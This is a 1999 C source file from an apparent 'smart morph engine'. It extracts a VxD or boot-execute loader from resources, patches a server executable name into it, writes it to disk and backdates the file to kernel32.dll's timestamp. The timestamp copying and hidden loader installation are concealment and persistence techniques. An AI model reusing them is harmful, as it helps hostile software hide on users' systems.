/*
  smart morph engine - high level procedures
  written by alexander yaworsky
  september '99
*/

#include <windows.h>

#include "filetime.h"
#include "paths.h"
#include "resource.h"
#include "registry.h"
#include "sm.h"
#include "stdlib.h"
#include "stringlist.h"
#include "syslog.h"
#include "switches.h"


//********* SM_ExtractVxD/Bootexec - simply patch loader *******************


static BYTE* GetLoader( DWORD ResId, DWORD* Sz )
  {
    BYTE   *ResPtr, *Buf;

    ResPtr = SM_GetResource( RT_FILE, ResId, Sz );
    if( ResPtr == NULL ) return NULL;
    Buf = LocalAlloc( LMEM_FIXED, *Sz );
    if( Buf == NULL ) {
      SysLog( "SM_ExtractVxD/Bootexec: out of memory" );
      return FALSE;
    }
    CopyMemory( Buf, ResPtr, *Sz );
    return Buf;
  }

static BOOL SubstOleproc( BYTE* Buf, DWORD BufSz,
                          BYTE* OriginalName, DWORD OriginalNameSz,
                          BYTE* NewName, DWORD NewNameSz )
  {
    DWORD  i, j;

    j = BufSz - OriginalNameSz;
    for( i = 0; i < j; i++ )
      if( Buf[ i ] == OriginalName[ 0 ] )
        if( Memcmp( Buf + i, OriginalName, OriginalNameSz ) == 0 ) {
          CopyMemory( Buf + i, NewName, NewNameSz );
          if( NewNameSz < OriginalNameSz )
            for( j = NewNameSz; j < OriginalNameSz; j++ ) Buf[ i + j ] = 0;
          return TRUE;
        }
    SysLog( "Cannot patch loader" );
    return FALSE;
  }

static BOOL WriteLoader( char* FileName, BYTE* Buf, DWORD BufSz )
  {
    SYSTEMTIME      Stm;
    HANDLE          Fh;
    char            K32Path[ MAX_PATH ];
    BOOL   Rc;
    DWORD  s;

    Fh = CreateFile( FileName, GENERIC_READ | GENERIC_WRITE,
                     0, NULL, OPEN_ALWAYS, 0, NULL );
    if( Fh == INVALID_HANDLE_VALUE ) {
      SysLog( "SM_ExtractVxD/Bootexec: CreateFile( %s ) failed, error %d",
              FileName, GetLastError() );
      return FALSE;
    }
    SetEndOfFile( Fh );
    Rc = WriteFile( Fh, Buf, BufSz, &s, NULL );
    CloseHandle( Fh );
    if( Rc == FALSE || s != BufSz ) {
      SysLog( "ExtractFileFromResource: WriteFile failed, error %d", GetLastError() );
      DeleteFile( FileName );
      Rc = FALSE;
    }
    else {
      GetKernel32Path( K32Path );
      GetLocalFileTime( K32Path, &Stm );
      SetLocalFileTime( FileName, &Stm );
      Rc = TRUE;
    }
    return Rc;
  }

BOOL SM_ExtractBootexec( char* FileName, char* SrvName, DWORD ResId )
  {
    BYTE   *Buf;
    DWORD  Sz, i, j;
    char   Name[32];
    char   Oleproc[] = {'t',0,'m',0,'s',0,'s',0,'u',0,'p',0,'p',0,'.',0,
                        'e',0,'x',0,'e',0,0,0};
    BOOL   Rc;

    RtlZeroMemory( Name, sizeof( Name ) );
    j = lstrlen( SrvName );
    if( j > 12 ) {
      SysLog( "SM_ExtractBootexec: server name too long" );
      return FALSE;
    }
    for( i = 0; i < j; i++ ) Name[ i * 2 ] = SrvName[ i ];
    Buf = GetLoader( ResId, &Sz );
    if( Buf == NULL ) return FALSE;
    Rc = FALSE;
    if( SubstOleproc( Buf, Sz, Oleproc, sizeof( Oleproc ), Name, j * 2 + 2 ) )
      if( WriteLoader( FileName, Buf, Sz ) ) Rc = TRUE;
    LocalFree( Buf );
    return Rc;
  }

BOOL SM_ExtractVxD( char* FileName, char* SrvName, DWORD ResId )
  {
    BYTE   *Buf;
    DWORD  Sz, j;
    char   Oleproc[] = "tmssupp.exe";
    BOOL   Rc;

    j = lstrlen( SrvName );
    if( j > 12 ) {
      SysLog( "SM_ExtractVxD: server name too long" );
      return FALSE;
    }
    Buf = GetLoader( ResId, &Sz );
    if( Buf == NULL ) return FALSE;
    Rc = FALSE;
    if( SubstOleproc( Buf, Sz, Oleproc, lstrlen( Oleproc ) + 1,
                      SrvName, j + 1 ) )
      if( WriteLoader( FileName, Buf, Sz ) ) Rc = TRUE;
    LocalFree( Buf );
    return Rc;
  }
